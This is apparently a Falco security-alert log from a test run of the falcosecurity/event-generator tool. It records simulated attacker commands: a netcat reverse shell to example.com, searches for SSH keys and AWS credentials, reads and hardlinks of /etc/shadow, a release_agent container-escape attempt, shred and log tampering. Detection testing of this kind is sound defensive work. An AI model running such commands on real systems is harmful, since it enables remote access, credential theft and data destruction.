2026-04-06T19:09:48.839682574Z	Warning	Write Binary Under UsrLocalBin	2026-04-06T19:09:48.839682574+0000: Warning Falco Custom: File write in /usr/local/bin (container=lab9-helper user=root file=/usr/local/bin/drift.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER) container_id=13c5e802dbf9 container_name=lab9-helper container_image_repository=alpine container_image_tag=3.19 k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.776128214Z	Informational	System user interactive	2026-04-06T19:21:00.776128214+0000: Informational System user ran an interactive command | evt_type=execve user=daemon user_uid=2 user_loginuid=-1 process=login proc_exepath=/bin/busybox parent=event-generator command=login terminal=0 exe_flags=EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.039999991Z	Critical	Fileless execution via memfd_create	2026-04-06T19:21:01.039999991+0000: Critical Fileless execution via memfd_create | container_start_ts=1775503259307759675 proc_cwd=/ evt_res=SUCCESS proc_sname=event-generator gparent=containerd-shim evt_type=execve user=root user_uid=0 user_loginuid=-1 process=3 proc_exepath=memfd:program parent=event-generator command=3 run helper.DoNothing terminal=0 exe_flags=EXE_WRITABLE|EXE_FROM_MEMFD container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.300235019Z	Warning	Search Private Keys or Passwords	2026-04-06T19:21:01.300235019+0000: Warning Grep private keys or passwords activities found | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname id_rsa terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.401887609Z	Warning	Clear Log Activities	2026-04-06T19:21:01.401887609+0000: Warning Log files were tampered | file=/tmp/falco-event-generator-syscall-ClearLogActivities-3572262640/syslog evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.623835874Z	Notice	Packet socket created in container	2026-04-06T19:21:01.623835874+0000: Notice Packet socket was created in a container | socket_info=fd=3(<o>) domain=17(AF_PACKET) type=3 proto=3 connection= lport=<NA> rport=<NA> fd_type=<NA> fd_proto=<NA> evt_type=socket user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.755504961Z	Warning	Create Hardlink Over Sensitive Files	2026-04-06T19:21:01.755504961+0000: Warning Hardlinks created over sensitive files | target=/etc/shadow linkpath=/tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-10777739/shadow_link evt_type=link user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-10777739/shadow_link terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:01.858677203Z	Warning	Create Symlink Over Sensitive Files	2026-04-06T19:21:01.858677203+0000: Warning Symlinks created over sensitive files | target=/etc linkpath=/tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-867236271/etc_link evt_type=symlink user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-867236271/etc_link terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:07.985453872Z	Warning	Read sensitive file trusted after startup	2026-04-06T19:21:07.985453872+0000: Warning Sensitive file opened for reading by trusted program after startup | file=/etc/shadow pcmdline=event-generator run syscall gparent=containerd-shim ggparent=systemd gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=httpd proc_exepath=/bin/event-generator parent=event-generator command=httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:08.089778724Z	Warning	Directory traversal monitored file read	2026-04-06T19:21:08.089778724+0000: Warning Read monitored file via directory traversal | file=/etc/shadow fileraw=/etc/../etc/../etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:08.191458984Z	Warning	Remove Bulk Data from Disk	2026-04-06T19:21:08.191458984+0000: Warning Bulk data has been removed from disk | file=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=shred proc_exepath=/bin/busybox parent=event-generator command=shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-769381573 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:08.308038287Z	Warning	Read sensitive file untrusted	2026-04-06T19:21:08.308038287+0000: Warning Sensitive file opened for reading by non-trusted program | file=/etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:08.425311550Z	Notice	Disallowed SSH Connection Non Standard Port	2026-04-06T19:21:08.425311550+0000: Notice Disallowed SSH Connection | connection=172.17.0.5:56146->8.6.112.0:443 lport=443 rport=56146 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=ssh proc_exepath=/usr/bin/ssh parent=event-generator command=ssh user@example.com -p 443 terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:10.813607107Z	Warning	PTRACE attached to process	2026-04-06T19:21:10.813607107+0000: Warning Detected ptrace PTRACE_ATTACH attempt | proc_pcmdline=containerd-shim -namespace moby -id ac039efe590ba293f22a39c3c0d136463bb895c0eb7058c1aee8abd4a052a385 -address /run/containerd/containerd.sock evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:00.647488957Z	Notice	Packet socket created in container	2026-04-06T19:23:00.647488957+0000: Notice Packet socket was created in a container | socket_info=fd=3(<o>) domain=17(AF_PACKET) type=3 proto=3 connection= lport=<NA> rport=<NA> fd_type=<NA> fd_proto=<NA> evt_type=socket user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:00.754058212Z	Warning	PTRACE attached to process	2026-04-06T19:23:00.754058212+0000: Warning Detected ptrace PTRACE_ATTACH attempt | proc_pcmdline=containerd-shim -namespace moby -id 80355c57e4b4452595af8810e8191bcd7210ed72ea43f7e162976caa6eba703f -address /run/containerd/containerd.sock evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:00.998384518Z	Critical	Fileless execution via memfd_create	2026-04-06T19:23:00.998384518+0000: Critical Fileless execution via memfd_create | container_start_ts=1775503380261427266 proc_cwd=/ evt_res=SUCCESS proc_sname=event-generator gparent=containerd-shim evt_type=execve user=root user_uid=0 user_loginuid=-1 process=3 proc_exepath=memfd:program parent=event-generator command=3 run helper.DoNothing terminal=0 exe_flags=EXE_WRITABLE|EXE_FROM_MEMFD container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:01.398619404Z	Warning	Create Symlink Over Sensitive Files	2026-04-06T19:23:01.398619404+0000: Warning Symlinks created over sensitive files | target=/etc linkpath=/tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1192553497/etc_link evt_type=symlink user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1192553497/etc_link terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:01.508544495Z	Critical	Drop and execute new binary in container	2026-04-06T19:23:01.508544495+0000: Critical Executing binary not part of base image | proc_exe=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-82rtLx proc_sname=event-generator gparent=containerd-shim proc_exe_ino_ctime=1775503381505700574 proc_exe_ino_mtime=1775503381505700574 proc_exe_ino_ctime_duration_proc_start=2475715 proc_cwd=/ container_start_ts=1775503380261427266 evt_type=execve user=root user_uid=0 user_loginuid=-1 process=falco-event-gen proc_exepath=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-82rtLx parent=event-generator command=falco-event-gen terminal=0 exe_flags=EXE_WRITABLE|EXE_UPPER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:01.622462878Z	Warning	Create Hardlink Over Sensitive Files	2026-04-06T19:23:01.622462878+0000: Warning Hardlinks created over sensitive files | target=/etc/shadow linkpath=/tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-547054919/shadow_link evt_type=link user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-547054919/shadow_link terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:07.750193565Z	Warning	Read sensitive file trusted after startup	2026-04-06T19:23:07.750193565+0000: Warning Sensitive file opened for reading by trusted program after startup | file=/etc/shadow pcmdline=event-generator run syscall gparent=containerd-shim ggparent=systemd gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=httpd proc_exepath=/bin/event-generator parent=event-generator command=httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:07.856616678Z	Warning	Find AWS Credentials	2026-04-06T19:23:07.856616678+0000: Warning Detected AWS credentials search activity | proc_pcmdline=event-generator run syscall proc_cwd=/ group_gid=0 group_name=root user_loginname=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname .aws/credentials terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:08.047092150Z	Notice	Disallowed SSH Connection Non Standard Port	2026-04-06T19:23:08.047092150+0000: Notice Disallowed SSH Connection | connection=172.17.0.5:52956->104.18.27.120:443 lport=443 rport=52956 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=ssh proc_exepath=/usr/bin/ssh parent=event-generator command=ssh user@example.com -p 443 terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:10.581367000Z	Notice	PTRACE anti-debug attempt	2026-04-06T19:23:10.581367000+0000: Notice Detected potential PTRACE_TRACEME anti-debug attempt | proc_pcmdline=event-generator run syscall evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=event-generator command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:10.682813883Z	Warning	Search Private Keys or Passwords	2026-04-06T19:23:10.682813883+0000: Warning Grep private keys or passwords activities found | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname id_rsa terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:10.783700865Z	Warning	Directory traversal monitored file read	2026-04-06T19:23:10.783700865+0000: Warning Read monitored file via directory traversal | file=/etc/shadow fileraw=/etc/../etc/../etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:10.891734683Z	Warning	Debugfs Launched in Privileged Container	2026-04-06T19:23:10.891734683+0000: Warning Debugfs launched started in a privileged container | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=debugfs proc_exepath=/usr/sbin/debugfs parent=event-generator command=debugfs -V terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:10.997467286Z	Critical	Detect release_agent File Container Escapes	2026-04-06T19:23:10.997467286+0000: Critical Detect an attempt to exploit a container escape using release_agent file | file=/release_agent cap_effective=CAP_CHOWN CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_LINUX_IMMUTABLE CAP_NET_BIND_SERVICE CAP_NET_BROADCAST CAP_NET_ADMIN CAP_NET_RAW CAP_IPC_LOCK CAP_IPC_OWNER CAP_SYS_MODULE CAP_SYS_RAWIO CAP_SYS_CHROOT CAP_SYS_PTRACE CAP_SYS_PACCT CAP_SYS_ADMIN CAP_SYS_BOOT CAP_SYS_NICE CAP_SYS_RESOURCE CAP_SYS_TIME CAP_SYS_TTY_CONFIG CAP_MKNOD CAP_LEASE CAP_AUDIT_WRITE CAP_AUDIT_CONTROL CAP_SETFCAP CAP_MAC_OVERRIDE CAP_MAC_ADMIN CAP_SYSLOG CAP_WAKE_ALARM CAP_BLOCK_SUSPEND CAP_AUDIT_READ CAP_PERFMON CAP_BPF CAP_CHECKPOINT_RESTORE evt_type=open user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c echo 'hello world' > release_agent terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.226931689Z	Notice	Run shell untrusted	2026-04-06T19:23:11.226931689+0000: Notice Shell spawned by untrusted binary | parent_exe=/tmp/falco-event-generator-syscall-spawned-1044682962/httpd parent_exepath=/bin/event-generator pcmdline=httpd --loglevel info run ^helper.RunShell$ gparent=event-generator ggparent=containerd-shim aname[4]=systemd aname[5]=<NA> aname[6]=<NA> aname[7]=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=httpd command=sh -c ls > /dev/null terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.332586423Z	Informational	System user interactive	2026-04-06T19:23:11.332586423+0000: Informational System user ran an interactive command | evt_type=execve user=daemon user_uid=2 user_loginuid=-1 process=login proc_exepath=/bin/busybox parent=event-generator command=login terminal=0 exe_flags=EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.434228425Z	Warning	Remove Bulk Data from Disk	2026-04-06T19:23:11.434228425+0000: Warning Bulk data has been removed from disk | file=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=shred proc_exepath=/bin/busybox parent=event-generator command=shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3322842598 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.544200841Z	Warning	Execution from /dev/shm	2026-04-06T19:23:11.544200841+0000: Warning File execution detected from /dev/shm | evt_res=SUCCESS file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-G7VYKs.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.544800447Z	Warning	Execution from /dev/shm	2026-04-06T19:23:11.544800447+0000: Warning File execution detected from /dev/shm | evt_res=EACCES file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-G7VYKs.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.645720185Z	Warning	Clear Log Activities	2026-04-06T19:23:11.645720185+0000: Warning Log files were tampered | file=/tmp/falco-event-generator-syscall-ClearLogActivities-1487647192/syslog evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.746255519Z	Warning	Read sensitive file untrusted	2026-04-06T19:23:11.746255519+0000: Warning Sensitive file opened for reading by non-trusted program | file=/etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:23:11.847653820Z	Warning	Netcat Remote Code Execution in Container	2026-04-06T19:23:11.847653820+0000: Warning Netcat runs inside container that allows remote code execution | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=nc proc_exepath=/usr/bin/nc parent=event-generator command=nc -e /bin/sh example.com 22 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=80355c57e4b4 container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
